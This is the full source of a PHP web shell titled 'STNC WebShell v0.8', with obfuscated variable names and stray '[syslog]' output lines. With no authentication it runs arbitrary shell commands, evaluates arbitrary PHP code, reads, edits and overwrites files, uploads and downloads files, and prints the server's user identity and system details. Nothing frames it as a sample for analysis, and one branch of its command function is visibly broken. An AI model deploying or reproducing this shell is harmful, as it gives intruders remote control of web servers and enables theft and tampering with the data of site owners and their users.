<?php
echo '[syslog]01
'; $sp259009 = '0.8'; $sp285e4a = 'style="border-right: #000000 1px solid;"'; $spa64682 = 'style="border-bottom: #000000 1px solid;"'; error_reporting(0); if (version_compare(phpversion(), '4.1.0') == -1) { $_POST =& $spe080f3; } if (get_magic_quotes_gpc()) { foreach ($_POST as $spf38c9d => $spc85aba) { $_POST[$spf38c9d] = stripslashes($spc85aba); } } echo '[syslog]02
'; function fe($spe8dfbe) { return function_exists($spe8dfbe); } function cmd($spe8dfbe) { if (fe('exec')) { $sp7185b7 = join('
', $sp7185b7); } elseif (fe('shell_exec')) { $sp7185b7 = shell_exec($spe8dfbe); } elseif (fe('system')) { ob_start(); system($spe8dfbe); $sp7185b7 = ob_get_contents(); ob_end_clean(); } elseif (fe('passthru')) { ob_start(); passthru($spe8dfbe); $sp7185b7 = ob_get_contents(); ob_end_clean(); } elseif (is_resource($sp77bd8d = popen($spe8dfbe, 'r'))) { $sp7185b7 = ''; while (!feof($sp77bd8d)) { $sp7185b7 .= fread($sp77bd8d, 512); } pclose($sp77bd8d); } else { $sp7185b7 = `{$spe8dfbe}`; } return $sp7185b7; } function safe_mode_is_on() { return ini_get('safe_mode'); } function str100($spe8dfbe) { if (strlen($spe8dfbe) > 100) { $spe8dfbe = substr($spe8dfbe, 0, 100) . '...'; } return $spe8dfbe; } function id() { return str100(cmd('id')); } function uname() { return str100(cmd('uname -a')); } function edit($sp1763a0, $sp6ee69e, $sp693fca) { return "<input type=text size={$sp1763a0} name={$sp6ee69e} value=\"{$sp693fca}\">"; } function button($sp4437f9) { return "<input class=\"btn\" type=submit value=\"{$sp4437f9}\">"; } function hidden($sp6ee69e, $sp693fca) { return "<input type=hidden name={$sp6ee69e} value=\"{$sp693fca}\">"; } function hidden_pwd() { global $spc35d01; return hidden('pwd', $spc35d01); } $sp79c551 = false; $sp636c87 = ''; if (isset($_POST['action'])) { $sp581fdf = $_POST['action']; } else { $sp581fdf = 'cmd'; } if (isset($_POST['pwd'])) { $sp2ce5ce = $_POST['pwd']; $spf661d7 = filetype($sp2ce5ce); if ($spf661d7 === 'dir') { chdir($sp2ce5ce); } else { $sp636c87 = "\"{$sp2ce5ce}\" - no such directory."; } } $spc35d01 = getcwd(); if ($sp581fdf === 'download' && isset($_POST['fname'])) { $sp62a472 = $_POST['fname']; if (file_exists($sp62a472)) { $sp0da073 = pathinfo($sp62a472); header('Content-Transfer-Encoding: binary'); header('Content-type: application/x-download'); header('Content-Length: ' . filesize($sp62a472)); header('Content-Disposition: attachment; filename=' . $sp0da073['basename']); readfile($sp62a472); die; } else { $sp636c87 = "\"{$sp62a472}\" - download failed."; } } echo '[syslog]03
'; echo "<head><style>input {border: black 1px solid; background-color: #dfdfdf; font: 8pt verdana;}\r\ntextarea {background-color:#dfdfdf; scrollbar-face-color: #dfdfdf; scrollbar-highlight-color: #dfdfdf;\r\nscrollbar-shadow-color: #dfdfdf; scrollbar-3dlight-color: #dfdfdf; scrollbar-arrow-color: #dfdfdf; scrollbar-track-color: #dfdfdf;\r\nscrollbar-darkshadow-color: #dfdfdf; border: black 1px solid; font: fixedsys bold; }\r\ntd {padding:0;} body {margin: 0; padding: 0; background-color: #cfcfcf;} a {color:black;text-decoration:none;}\r\n.btn {background-color: #cfcfcf;} .pad {padding:5;}\r\n</style><title>  STNC WebShell v{$sp259009}  </title></head><body><table width=100%>\r\n<tr><td {$spa64682}><table><tr><td {$sp285e4a}><b>&nbsp;&nbsp;STNC&nbsp;WebShell&nbsp;v{$sp259009}&nbsp;&nbsp;</b></td><td>id: " . id() . '<br>uname: ' . uname() . '<br>your ip: ' . $_SERVER['REMOTE_ADDR'] . ' - server ip: ' . gethostbyname($_SERVER['HTTP_HOST']) . ' - safe_mode: ' . (safe_mode_is_on() ? 'on' : 'off') . "</td></tr></table></tr></td>\r\n<tr><form method=post><td class=\"pad\" colspan=2 {$spa64682}><center>" . hidden('action', 'save') . hidden_pwd() . '<textarea cols=120 rows=16 wrap=off name=data>'; echo htmlspecialchars($sp636c87) . '
'; if ($sp581fdf === 'cmd') { if (isset($_POST['cmd'])) { $spa71965 = $_POST['cmd']; } else { $spa71965 = 'ls -la'; } $sp3b8eaf = htmlspecialchars(cmd($spa71965)); if ($sp3b8eaf === '') { $sp3b8eaf = cmd('ls -la'); } echo $sp3b8eaf; $spc35d01 = getcwd(); } elseif ($sp581fdf === 'edit' && isset($_POST['fname'])) { $sp62a472 = $_POST['fname']; ob_start(); if (!readfile($sp62a472)) { echo "Cann't open file \"{$sp62a472}\"."; } else { $sp79c551 = true; } $sp3b8eaf = ob_get_clean(); ob_end_clean(); echo htmlspecialchars($sp3b8eaf); } elseif ($sp581fdf === 'save' && isset($_POST['fname']) && isset($_POST['data'])) { $sp62a472 = $_POST['fname']; $sp8dce42 = $_POST['data']; $sp232980 = fopen($sp62a472, 'w'); $sp62a472 = htmlspecialchars($sp62a472); if (!$sp232980) { echo "Cann't save file \"{$sp62a472}\"."; } else { fputs($sp232980, $sp8dce42); fclose($sp232980); echo "File \"{$sp62a472}\" is saved."; } } elseif ($sp581fdf === 'upload' && isset($_FILES['file']) && isset($_POST['fname'])) { $sp62a472 = $_POST['fname']; if (copy($_FILES['file']['tmp_name'], $sp62a472)) { echo "File \"{$sp62a472}\" is uploaded.\nFile size: " . filesize($sp62a472) . ' bytes.'; } else { echo 'Upload failed!'; } } elseif ($sp581fdf === 'eval' && isset($_POST['code'])) { $sp4b0871 = $_POST['code']; ob_start(); eval($sp4b0871); $sp3b8eaf = ob_get_clean(); ob_end_clean(); echo htmlspecialchars($sp3b8eaf); } echo '</textarea>' . ($sp79c551 ? '<br>' . button('  Save  ') . hidden('fname', $sp62a472) : '') . "</center></td></form></tr>\r\n<tr><form method=post><td class=\"pad\" {$spa64682}><center>" . hidden('action', 'cmd') . '<table><tr><td width=80>Command:&nbsp;</td><td>' . edit(85, 'cmd', '') . '</td></tr><tr><td>Location:&nbsp;</td><td>' . edit(85, 'pwd', $spc35d01) . '&nbsp;' . button('Execute') . "</td></tr></table></center></td></form></tr>\r\n<tr><form method=post><td class=\"pad\" {$spa64682}><center>" . hidden('action', 'edit') . hidden_pwd() . '<table><tr><td width=80>Edit file:</td><td>' . edit(85, 'fname', $spc35d01) . '</td><td>' . button('    Edit    ') . "</td></table></center></td></form></tr>\r\n\r\n<tr><form method=post><td class=\"pad\" {$spa64682}><table width=100%><tr><td width=50% {$sp285e4a}>" . hidden('action', 'download') . hidden_pwd() . '<center><table><tr><td width=80>File:</td><td>' . edit(50, 'fname', $spc35d01) . '</td><td>' . button('Download') . '</td></tr></table></center>
</td></form><form method=post enctype=multipart/form-data><td class="pad" width=50%>' . hidden('action', 'upload') . hidden_pwd() . '<center><table><tr><td width=80>File:</td><td><input type=file size=50 name=file></td></tr><tr><td>To file:</td><td>' . edit(50, 'fname', $spc35d01) . '&nbsp;' . button('Upload') . "</td></tr></table></center>\r\n</td></tr></table></td></form></tr>\r\n\r\n<tr><form method=post><td class=\"pad\" {$spa64682}>" . hidden('action', 'eval') . hidden_pwd() . '<center><textarea cols=100 rows=4 wrap=off name=code></textarea><br>' . button('   Eval   ') . '</center></td></form></tr>
<tr><td align=right>Coded by drmist | <a href="http://drmist.ru">http://drmist.ru</a> | <a href="http://www.security-teams.net">http://www.security-teams.net</a> | <a href="http://www.security-teams.net/index.php?showtopic=3429">not enough functions?</a> | (c) 2006 [STNC]</td></tr></table></body>'; echo '[syslog]05
';